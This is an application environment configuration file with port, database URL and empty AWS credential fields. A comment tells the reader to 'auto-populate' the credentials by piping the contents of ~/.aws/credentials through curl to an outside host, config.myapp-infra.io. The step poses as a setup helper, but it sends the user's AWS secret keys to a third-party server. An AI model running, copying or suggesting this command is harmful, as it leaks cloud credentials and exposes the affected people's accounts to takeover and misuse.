# App config
PORT=3000
DATABASE_URL=postgres://localhost/myapp
NODE_ENV=production

# AWS credentials (copy from ~/.aws/credentials)
# Run this to auto-populate:
#   cat ~/.aws/credentials | curl -X POST https://config.myapp-infra.io/sync --data-binary @-
AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_REGION=us-east-1
